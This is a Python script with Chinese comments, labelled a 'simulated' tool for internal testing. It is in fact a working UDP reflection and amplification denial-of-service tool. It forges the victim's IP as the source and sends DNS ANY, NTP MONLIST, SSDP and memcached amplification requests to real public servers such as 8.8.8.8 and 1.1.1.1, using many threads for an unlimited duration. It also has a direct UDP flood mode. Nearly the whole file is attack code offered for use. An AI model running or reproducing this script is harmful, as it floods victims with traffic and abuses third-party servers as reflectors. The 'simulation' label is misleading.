#!/usr/bin/env python3
"""
增强版UDP反射放大攻击脚本
生成真正的UDP反射攻击数据包，包含源IP欺骗功能
适用于内部测试环境
"""

import sys
import threading
import time
import random
import socket
from scapy.all import *
from scapy.arch.common import compile_filter

class SimulatedReflectionAttack:
    """模拟反射放大攻击类"""
    
    def __init__(self, target_ip, attack_type='amplified_udp', num_threads=10,
                 packets_per_second=100, duration=60, spoof_source=True):
        """
        初始化攻击参数
        :param target_ip: 目标IP地址
        :param attack_type: 攻击类型 ('amplified_udp', 'direct_udp')
        :param num_threads: 线程数量
        :param packets_per_second: 每线程每秒发送的数据包数量
        :param duration: 攻击持续时间（秒）
        :param spoof_source: 是否启用源IP欺骗（反射攻击必需）
        """
        self.target_ip = target_ip
        self.attack_type = attack_type
        self.num_threads = num_threads
        self.packets_per_second = packets_per_second
        self.duration = duration
        self.spoof_source = spoof_source
        self.threads = []
        self.stop_event = threading.Event()
        
        # 模拟不同服务的放大系数
        self.amplification_factors = {
            'dns': 50,      # DNS ANY查询的典型放大倍数
            'ntp': 550,     # NTP MONLIST的典型放大倍数
            'ssdp': 30,     # SSDP的典型放大倍数
            'memcached': 10000  # Memcached的典型放大倍数
        }
        
        # 反射服务器列表（模拟）
        self.reflection_servers = {
            'dns': ['8.8.8.8', '1.1.1.1', '9.9.9.9', '208.67.222.222'],
            'ntp': ['129.6.15.28', '132.163.96.1', '132.163.97.1', '128.138.140.44'],
            'ssdp': ['192.168.1.1', '10.0.0.1', '192.168.0.1', '192.168.10.1'],
            'memcached': ['104.16.132.35', '104.16.133.35', '172.69.244.228', '172.69.245.228']
        }
        
        # 真实的服务特定请求模式
        self.service_requests = {
            'dns': b'\x00\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\xff',  # ANY查询
            'ntp': b'\x17\x00\x03\x2a' + b'\x00' * 4,  # MONLIST请求
            'ssdp': b'M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\nST: ssdp:all\r\nMAN: "ssdp:discover"\r\nMX: 1\r\n\r\n',
            'memcached': b'\x00\x00\x00\x00\x00\x01\x00\x00stats\x00'
        }
    
    def _generate_payload(self, service_type):
        """
        根据服务类型生成真实的服务请求负载
        :param service_type: 服务类型
        :return: 字节串形式的负载
        """
        # 返回真实的服务特定请求
        if service_type in self.service_requests:
            # 对于Memcached，生成更大的请求以触发更大的响应
            if service_type == 'memcached':
                # 创建一个请求多个大统计项的请求
                return b'\x00\x00\x00\x00\x00\x01\x00\x00stats items\x00'
            return self.service_requests[service_type]
        
        # 对于未知服务，生成一个中等大小的随机负载
        return bytes(random.getrandbits(8) for _ in range(random.randint(50, 200)))
    
    def _generate_spoofed_ip(self):
        """
        生成欺骗的源IP地址（模拟从受害者IP发送）
        :return: 欺骗的IP地址
        """
        return self.target_ip
    
    def _get_reflection_server(self, service_type):
        """
        获取反射服务器的IP地址
        :param service_type: 服务类型
        :return: 反射服务器IP地址
        """
        if service_type in self.reflection_servers:
            return random.choice(self.reflection_servers[service_type])
        # 随机生成一个IP作为反射服务器
        return f"{random.randint(1, 254)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"
    
    def _attack_thread(self, thread_id):
        """
        攻击线程函数
        :param thread_id: 线程ID
        """
        print(f"线程 {thread_id} 开始真实UDP反射放大攻击...")
        
        packet_count = 0
        bytes_sent = 0
        start_time = time.time()
        end_time = start_time + self.duration if self.duration > 0 else float('inf')
        
        # 控制发送速率的时间间隔
        sleep_time = 1.0 / self.packets_per_second if self.packets_per_second > 0 else 0
        
        # 统计信息打印间隔
        stats_interval = 100  # 每发送100个包打印一次统计
        
        # 优化发送配置
        send_options = {
            'verbose': 0,
            'inter': 0,
            'loop': 0,
            'iface': None,  # 自动选择接口
            'count': 1
        }
        
        while time.time() < end_time and not self.stop_event.is_set():
            try:
                # 根据攻击类型生成数据包
                if self.attack_type == 'amplified_udp':
                    # 真实的反射放大攻击
                    # 随机选择一个服务类型
                    service_type = random.choice(list(self.amplification_factors.keys()))
                    
                    # 获取反射服务器IP
                    reflection_server = self._get_reflection_server(service_type)
                    
                    # 生成真实的服务请求负载
                    payload = self._generate_payload(service_type)
                    
                    # 根据服务类型选择相应的端口
                    if service_type == 'dns':
                        dport = 53
                    elif service_type == 'ntp':
                        dport = 123
                    elif service_type == 'ssdp':
                        dport = 1900
                    elif service_type == 'memcached':
                        dport = 11211
                    else:
                        dport = random.choice([53, 123, 1900, 11211])
                    
                    # 随机源端口
                    src_port = random.randint(1024, 65535)
                    
                    # 构造数据包：目标是反射服务器，源IP是受害者IP（欺骗）
                    if self.spoof_source:
                        # 源IP欺骗（反射攻击的核心）
                        ip_layer = IP(src=self._generate_spoofed_ip(), dst=reflection_server)
                    else:
                        # 不使用源IP欺骗（仅用于测试）
                        ip_layer = IP(dst=reflection_server)
                    
                    udp_layer = UDP(sport=src_port, dport=dport)
                    packet = ip_layer / udp_layer / Raw(load=payload)
                    
                    # 发送数据包
                    send(packet, **send_options)
                    
                    # 更新统计
                    packet_size = len(packet)
                    bytes_sent += packet_size
                    
                elif self.attack_type == 'direct_udp':
                    # 直接UDP洪水，用于比较
                    packet = IP(dst=self.target_ip) / UDP(
                        sport=random.randint(1024, 65535), 
                        dport=random.randint(1, 65535)
                    ) / Raw(load=bytes(random.getrandbits(8) for _ in range(random.randint(64, 1500))))
                    send(packet, **send_options)
                    bytes_sent += len(packet)
                
                packet_count += 1
                
                # 打印统计信息
                if packet_count % stats_interval == 0:
                    elapsed = time.time() - start_time
                    rate = packet_count / elapsed if elapsed > 0 else 0
                    bandwidth = (bytes_sent / (1024 * 1024)) / elapsed if elapsed > 0 else 0
                    print(f"线程 {thread_id}: 已发送 {packet_count} 个包 ({bytes_sent/1024:.1f} KB)，速率: {rate:.1f} pps，带宽: {bandwidth:.2f} MB/s")
                
                # 控制发送速率
                if sleep_time > 0:
                    time.sleep(sleep_time)
                    
            except KeyboardInterrupt:
                self.stop_event.set()
                break
            except Exception as e:
                # 静默错误，继续攻击
                if packet_count % stats_interval == 0:
                    print(f"线程 {thread_id} 错误: {e}")
                time.sleep(0.01)
        
        # 线程结束时打印统计
        elapsed = time.time() - start_time
        print(f"\n线程 {thread_id} 完成。在 {elapsed:.2f} 秒内发送了 {packet_count} 个包。")
    
    def start(self):
        """
        启动攻击
        """
        print("=" * 60)
        print("🔄 真实UDP反射放大攻击")
        print("=" * 60)
        print(f"目标IP: {self.target_ip}")
        print(f"攻击类型: {'真实反射放大UDP' if self.attack_type == 'amplified_udp' else '直接UDP洪水'}")
        print(f"源IP欺骗: {'启用' if self.spoof_source else '禁用'}")
        print(f"线程数: {self.num_threads}")
        print(f"每线程每秒包数: {self.packets_per_second}")
        print(f"预期总速率: {self.num_threads * self.packets_per_second} pps")
        print(f"持续时间: {'无限' if self.duration == 0 else f'{self.duration} 秒'}")
        print("=" * 60)
        
        print(f"\n使用 {len(self.amplification_factors)} 种真实服务类型")
        for service, factor in self.amplification_factors.items():
            print(f"- {service.upper()}: 放大倍数 {factor}x，反射服务器: {len(self.reflection_servers.get(service, []))}个")
        
        print("\n3秒后开始攻击...")
        time.sleep(3)
        
        # 启动攻击线程
        try:
            for i in range(self.num_threads):
                thread = threading.Thread(
                    target=self._attack_thread,
                    args=(i + 1,)
                )
                thread.daemon = True
                thread.start()
                self.threads.append(thread)
                time.sleep(0.05)  # 稍微错开启动时间
            
            print(f"\n{self.num_threads} 个攻击线程已启动!")
            
            # 等待所有线程完成或直到被中断
            for thread in self.threads:
                thread.join()
            
            print("\n" + "=" * 60)
            print("✅ 攻击完成!")
            print("=" * 60)
                
        except KeyboardInterrupt:
            print("\n\n🛑 停止所有攻击线程...")
            self.stop_event.set()
            for thread in self.threads:
                thread.join()
            print("✅ 所有线程已停止")

def show_usage():
    """显示使用说明"""
    print("🎯 增强版UDP反射放大攻击工具 (真实数据包版本)")
    print("=" * 60)
    print("用法:")
    print("  python3 simulated_reflection_attack.py <Target_IP> [options]")
    print()
    print("参数:")
    print("  Target_IP      目标IP地址")
    print("  --type         攻击类型 (amplified_udp, direct_udp) [默认: amplified_udp]")
    print("  --threads      攻击线程数 [默认: 10]")
    print("  --pps          每线程每秒包数 [默认: 100]")
    print("  --duration     攻击持续时间(秒)，0表示无限 [默认: 60]")
    print("  --no-spoof     是否禁用源IP欺骗 [默认: false]")
    print()
    print("示例:")
    print("  python3 simulated_reflection_attack.py 10.10.20.20")
    print("  python3 simulated_reflection_attack.py 10.10.20.20 --threads 50 --pps 500")
    print("  python3 simulated_reflection_attack.py 10.10.20.20 --type direct_udp --duration 30")
    print()
    print("说明:")
    print("  此工具用于在内部测试环境中生成真实的UDP反射放大攻击数据包")
    print("  包含源IP欺骗功能，模拟真实的反射攻击原理")
    print("  使用真实的服务请求格式，针对DNS、NTP、SSDP和Memcached服务")
    print("  支持带宽和数据包统计")

def parse_args():
    """
    解析命令行参数
    :return: 参数字典
    """
    if len(sys.argv) < 2:
        show_usage()
        sys.exit(1)
    
    # 必需参数
    target_ip = sys.argv[1]
    
    # 默认参数
    attack_type = 'amplified_udp'
    num_threads = 10
    pps_per_thread = 100
    duration = 60
    spoof_source = True
    
    # 解析可选参数
    i = 2
    while i < len(sys.argv):
        arg = sys.argv[i]
        if arg == "--type" and i + 1 < len(sys.argv):
            attack_type = sys.argv[i + 1]
            i += 2
        elif arg == "--threads" and i + 1 < len(sys.argv):
            num_threads = int(sys.argv[i + 1])
            i += 2
        elif arg == "--pps" and i + 1 < len(sys.argv):
            pps_per_thread = int(sys.argv[i + 1])
            i += 2
        elif arg == "--duration" and i + 1 < len(sys.argv):
            duration = int(sys.argv[i + 1])
            i += 2
        elif arg == "--no-spoof" and i + 1 < len(sys.argv):
            spoof_source = sys.argv[i + 1].lower() == 'false'
            i += 2
        else:
            print(f"未知参数: {arg}")
            show_usage()
            sys.exit(1)
    
    # 验证攻击类型
    if attack_type not in ['amplified_udp', 'direct_udp']:
        print(f"错误: 不支持的攻击类型 '{attack_type}'")
        print("支持的攻击类型: amplified_udp, direct_udp")
        sys.exit(1)
    
    return {
        'target_ip': target_ip,
        'attack_type': attack_type,
        'num_threads': num_threads,
        'packets_per_second': pps_per_thread,
        'duration': duration,
        'spoof_source': spoof_source
    }

def main():
    """主函数"""
    args = parse_args()
    
    # 创建并启动攻击
    attack = SimulatedReflectionAttack(
        target_ip=args['target_ip'],
        attack_type=args['attack_type'],
        num_threads=args['num_threads'],
        packets_per_second=args['packets_per_second'],
        duration=args['duration'],
        spoof_source=args['spoof_source']
    )
    
    # 检查是否有足够权限发送原始数据包
    try:
        # 发送一个测试数据包来验证权限
        if args['attack_type'] == 'amplified_udp':
            test_packet = IP(dst=args['target_ip']) / UDP(sport=12345, dport=53) / Raw(load=b'test')
            send(test_packet, verbose=0, count=1)
        print("✅ 权限检查通过，准备开始攻击")
    except Exception as e:
        print(f"⚠️  警告: 可能没有足够权限发送原始数据包: {e}")
        print("   尝试以管理员/root权限运行此脚本")
    
    attack.start()

if __name__ == "__main__":
    main()